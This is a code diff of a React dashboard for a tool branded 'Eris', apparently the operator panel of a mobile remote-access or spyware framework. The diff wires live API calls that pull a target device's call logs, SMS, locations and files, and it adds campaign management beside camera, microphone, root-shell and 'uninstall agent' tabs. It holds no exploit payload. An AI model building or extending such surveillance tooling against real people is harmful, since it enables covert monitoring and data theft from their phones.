@@ -1,4 +1,3 @@
-
 'use client';
 
 import {
@@ -32,6 +31,7 @@ import {
   Activity,
   Compass,
   Trash2,
+  Users,
 } from 'lucide-react';
 import React from 'react';
 
@@ -59,8 +59,13 @@ import { TopNav, TopNavItem } from '@/components/ui/topnav';
 import { Separator } from '@/components/ui/separator';
 import { Sidebar } from '@/components/ui/sidebar';
 import { Settings } from '@/components/settings';
-import type { Device } from '@/lib/types';
-import { mockCalls, mockSms } from '@/lib/mock-data';
+import type { Device, Call, Sms, Location, Campaign, DeviceStats, TimelineEvent } from '@/lib/types';
+import { apiClient } from '@/lib/api-client';
+import { wsClient } from '@/lib/websocket-client';
+import { useToast } from '@/hooks/use-toast';
+import { CampaignManager } from '@/components/campaign-manager';
+import { LocationMap } from '@/components/location-map';
+import { FileExplorer } from '@/components/file-explorer';
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
 import { Input } from '@/components/ui/input';
 import { Terminal } from '@/components/terminal';
@@ -86,21 +91,21 @@ interface DashboardLayoutProps {
     onDeviceSelect: (device: Device | null) => void;
 }
 
-type TabValue = 
-  | 'dashboard' 
-  | 'terminal' 
-  | 'file_explorer' 
-  | 'frida' 
-  | 'camera' 
+type TabValue =
+  | 'dashboard'
+  | 'terminal'
+  | 'file_explorer'
+  | 'frida'
+  | 'camera'
   | 'mic'
-  | 'call_log' 
-  | 'sms' 
-  | 'live_view' 
-  | 'timeline' 
-  | 'mitre' 
-  | 'locations' 
-  | 'device_info';
-
+  | 'call_log'
+  | 'sms'
+  | 'live_view'
+  | 'timeline'
+  | 'mitre'
+  | 'locations'
+  | 'device_info'
+  | 'campaigns';
 
 export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect }: DashboardLayoutProps) {
   const [isIos, setIsIos] = React.useState(false);
@@ -110,29 +115,143 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
   const [tempDeviceName, setTempDeviceName] = React.useState(selectedDevice.name);
   const [isEditDialogOpen, setIsEditDialogOpen] = React.useState(false);
   const [confirmationGuid, setConfirmationGuid] = React.useState('');
+  const [calls, setCalls] = React.useState<Call[]>([]);
+  const [sms, setSms] = React.useState<Sms[]>([]);
+  const [locations, setLocations] = React.useState<Location[]>([]);
+  const [campaigns, setCampaigns] = React.useState<Campaign[]>([]);
+  const [selectedCampaign, setSelectedCampaign] = React.useState<string | null>(null);
+  const [isLoading, setIsLoading] = React.useState(false);
+  const [deviceStats, setDeviceStats] = React.useState<DeviceStats | null>(null);
+  const { toast } = useToast();
 
   React.useEffect(() => {
     setSelectedDevice(initialDevice);
     setDeviceName(initialDevice.name);
     setTempDeviceName(initialDevice.name);
+
+    loadDeviceData();
+
+    wsClient.subscribeToDevice(initialDevice.guid);
+    wsClient.on('device_status', handleDeviceUpdate);
+    wsClient.on('new_data', handleNewData);
+
+    return () => {
+      wsClient.unsubscribeFromDevice(initialDevice.guid);
+      wsClient.off('device_status', handleDeviceUpdate);
+      wsClient.off('new_data', handleNewData);
+    };
   }, [initialDevice]);
 
-  const handleDeviceNameSave = () => {
-    setDeviceName(tempDeviceName);
-    // Here you would typically also update the device name on your backend
-    setIsEditDialogOpen(false);
+  const loadDeviceData = async () => {
+    setIsLoading(true);
+    try {
+
+      const [callsRes, smsRes, campaignsRes, statsRes] = await Promise.all([
+        apiClient.getCalls(selectedDevice.guid, 100),
+        apiClient.getSms(selectedDevice.guid, 100),
+        apiClient.getCampaigns(),
+        apiClient.getDeviceStats()
+      ]);
+
+      if (callsRes.success && callsRes.data) setCalls(callsRes.data);
+      if (smsRes.success && smsRes.data) setSms(smsRes.data);
+      if (campaignsRes.success && campaignsRes.data) setCampaigns(campaignsRes.data);
+      if (statsRes.success && statsRes.data) setDeviceStats(statsRes.data);
+    } catch (error) {
+      console.error('Failed to load device data:', error);
+      toast({
+        variant: 'destructive',
+        title: 'Error',
+        description: 'Failed to load device data'
+      });
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const handleDeviceUpdate = (device: Device) => {
+    if (device.guid === selectedDevice.guid) {
+      setSelectedDevice(device);
+    }
+  };
+
+  const handleNewData = (data: { type: string; deviceId: string; count: number }) => {
+    if (data.deviceId === selectedDevice.guid) {
+
+      switch (data.type) {
+        case 'calls':
+          apiClient.getCalls(selectedDevice.guid, 100).then(res => {
+            if (res.success && res.data) setCalls(res.data);
+          });
+          break;
+        case 'sms':
+          apiClient.getSms(selectedDevice.guid, 100).then(res => {
+            if (res.success && res.data) setSms(res.data);
+          });
+          break;
+      }
+
+      toast({
+        title: 'New Data',
+        description: `Received ${data.count} new ${data.type} entries`,
+      });
+    }
+  };
+
+  const handleDeviceNameSave = async () => {
+    try {
+      const response = await apiClient.updateDeviceName(selectedDevice.guid, tempDeviceName);
+      if (response.success) {
+        setDeviceName(tempDeviceName);
+        setIsEditDialogOpen(false);
+        toast({
+          title: 'Success',
+          description: 'Device name updated successfully'
+        });
+      } else {
+        toast({
+          variant: 'destructive',
+          title: 'Error',
+          description: response.error || 'Failed to update device name'
+        });
+      }
+    } catch (error) {
+      toast({
+        variant: 'destructive',
+        title: 'Error',
+        description: 'Failed to update device name'
+      });
+    }
   }
 
   const handleDeviceDeselect = () => {
     onDeviceSelect(null);
   };
 
-  const handleDeleteAgent = () => {
-    // This is where you would call the API to uninstall the agent
-    console.log(`Uninstalling agent for ${selectedDevice.guid}`);
-    onDeviceSelect(null); // Go back to device selection screen
+  const handleDeleteAgent = async () => {
+    try {
+      const response = await apiClient.deleteDevice(selectedDevice.guid);
+      if (response.success) {
+        toast({
+          title: 'Success',
+          description: 'Agent uninstalled successfully'
+        });
+        onDeviceSelect(null);
+      } else {
+        toast({
+          variant: 'destructive',
+          title: 'Error',
+          description: response.error || 'Failed to uninstall agent'
+        });
+      }
+    } catch (error) {
+      toast({
+        variant: 'destructive',
+        title: 'Error',
+        description: 'Failed to uninstall agent'
+      });
+    }
   };
-
 
   return (
     <div className="flex min-h-screen w-full flex-col bg-background">
@@ -144,7 +263,9 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                         <span className="sr-only">Toggle sidebar</span>
                     </Button>
                 </Sidebar>
-                 <div className="flex items-center gap-2">
+                <img src="/Eris.svg" alt="Eris" className="h-8 w-8" />
+                <div className="flex items-center gap-2">
+                    <span className="text-sm text-muted-foreground">Eris /</span>
                     <h1 className="text-lg font-semibold md:text-xl">{deviceName}</h1>
                     <Dialog open={isEditDialogOpen} onOpenChange={setIsEditDialogOpen}>
                       <DialogTrigger asChild>
@@ -157,8 +278,8 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                             Enter a new name for your device. This will only change the display name.
                           </DialogDescription>
                         </DialogHeader>
-                        <Input 
-                          value={tempDeviceName} 
+                        <Input
+                          value={tempDeviceName}
                           onChange={(e) => setTempDeviceName(e.target.value)}
                           placeholder="Enter new device name"
                         />
@@ -190,6 +311,7 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                 <TopNavItem icon={<Waypoints />} label="MITRE ATT&CK" isActive={activeTab === 'mitre'} onClick={() => setActiveTab('mitre')} />
                 <TopNavItem icon={<MapPin />} label="Locations" isActive={activeTab === 'locations'} onClick={() => setActiveTab('locations')} />
                 <TopNavItem icon={<Shield />} label="Device Info" isActive={activeTab === 'device_info'} onClick={() => setActiveTab('device_info')} />
+                <TopNavItem icon={<Users />} label="Campaigns" isActive={activeTab === 'campaigns'} onClick={() => setActiveTab('campaigns')} />
             </TopNav>
             <main className="flex-1 p-4 grid grid-cols-1 lg:grid-cols-3 gap-4">
                 <div className={cn("space-y-4", activeTab === 'dashboard' ? "lg:col-span-2" : "lg:col-span-3")}>
@@ -231,25 +353,13 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                         </Card>
                     )}
                     {activeTab === 'file_explorer' && (
-                        <Card>
-                        <CardHeader>
-                            <CardTitle>File Explorer</CardTitle>
-                        </CardHeader>
-                        <CardContent className="text-center text-muted-foreground">
-                            <p>/sdcard/Downloads/</p>
-                            <div className="mt-4">
-                            <Button>
-                                <Download className="mr-2 h-4 w-4" />
-                                Exfiltrate Files
-                            </Button>
-                            </div>
-                        </CardContent>
-                        </Card>
+                        <FileExplorer device={selectedDevice} />
                     )}
                      {activeTab === 'terminal' && (
-                        <Terminal 
+                        <Terminal
+                            deviceId={selectedDevice.guid}
                             deviceType={selectedDevice.os}
-                            currentContext="root shell" 
+                            currentContext="root shell"
                         />
                     )}
                     {activeTab === 'camera' && (
@@ -314,8 +424,8 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                                     </TableRow>
                                 </TableHeader>
                                 <TableBody>
-                                    {mockCalls.length > 0 ? mockCalls.map((call, index) => (
-                                        <TableRow key={index}>
+                                    {calls.length > 0 ? calls.map((call) => (
+                                        <TableRow key={call.id}>
                                             <TableCell>{call.name || call.number}</TableCell>
                                             <TableCell>{call.type}</TableCell>
                                             <TableCell>{call.date}</TableCell>
@@ -323,7 +433,9 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                                         </TableRow>
                                     )) : (
                                         <TableRow>
-                                            <TableCell colSpan={4} className="text-center">No call logs available.</TableCell>
+                                            <TableCell colSpan={4} className="text-center">
+                                                {isLoading ? 'Loading call logs...' : 'No call logs available.'}
+                                            </TableCell>
                                         </TableRow>
                                     )}
                                 </TableBody>
@@ -346,15 +458,17 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                                     </TableRow>
                                 </TableHeader>
                                 <TableBody>
-                                    {mockSms.length > 0 ? mockSms.map((sms, index) => (
-                                        <TableRow key={index}>
-                                            <TableCell>{sms.from}</TableCell>
-                                            <TableCell>{sms.message}</TableCell>
-                                            <TableCell>{sms.date}</TableCell>
+                                    {sms.length > 0 ? sms.map((message) => (
+                                        <TableRow key={message.id}>
+                                            <TableCell>{message.type === 'received' ? message.from : message.to}</TableCell>
+                                            <TableCell className="max-w-xs truncate">{message.message}</TableCell>
+                                            <TableCell>{message.date}</TableCell>
                                         </TableRow>
                                     )) : (
                                         <TableRow>
-                                            <TableCell colSpan={3} className="text-center">No SMS messages available.</TableCell>
+                                            <TableCell colSpan={3} className="text-center">
+                                                {isLoading ? 'Loading SMS messages...' : 'No SMS messages available.'}
+                                            </TableCell>
                                         </TableRow>
                                     )}
                                 </TableBody>
@@ -459,7 +573,7 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                         </CardContent>
                         </Card>
                     )}
-                   
+
                     {activeTab === 'frida' && (
                         <Card>
                         <CardHeader>
@@ -471,14 +585,7 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                         </Card>
                     )}
                     {activeTab === 'locations' && (
-                        <Card>
-                        <CardHeader>
-                            <CardTitle>Locations</CardTitle>
-                        </CardHeader>
-                        <CardContent className="text-center text-muted-foreground">
-                            <p>Location tracking will be displayed here.</p>
-                        </CardContent>
-                        </Card>
+                        <LocationMap device={selectedDevice} height="600px" />
                     )}
                     {activeTab === 'device_info' && (
                         <Card>
@@ -526,7 +633,7 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                                         This action cannot be undone. This will permanently uninstall the agent from the target device and remove all its data. To confirm, please type the device GUID below.
                                         </AlertDialogDescription>
                                     </AlertDialogHeader>
-                                    <Input 
+                                    <Input
                                         placeholder="Enter device GUID to confirm"
                                         value={confirmationGuid}
                                         onChange={(e) => setConfirmationGuid(e.target.value)}
@@ -546,6 +653,13 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                                 </AlertDialog>
                             </CardFooter>
                         </Card>
+                    )}
+                    {activeTab === 'campaigns' && (
+                        <CampaignManager
+                            devices={[selectedDevice]}
+                            selectedCampaign={selectedCampaign}
+                            onCampaignSelect={setSelectedCampaign}
+                        />
                     )}
                 </div>
                 {activeTab === 'dashboard' && (
